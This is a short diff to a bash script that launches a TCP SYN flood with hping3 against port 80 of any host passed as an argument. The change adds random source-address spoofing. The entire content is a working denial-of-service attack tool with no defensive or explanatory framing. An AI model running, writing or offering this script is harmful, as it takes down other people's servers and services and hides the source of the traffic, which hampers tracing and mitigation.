@@ -1,2 +1,2 @@
 #!/bin/bash
-sudo hping3 --syn --flood -p 80 "$1"
+sudo hping3 --syn --flood --rand-source -p 80 "$1"
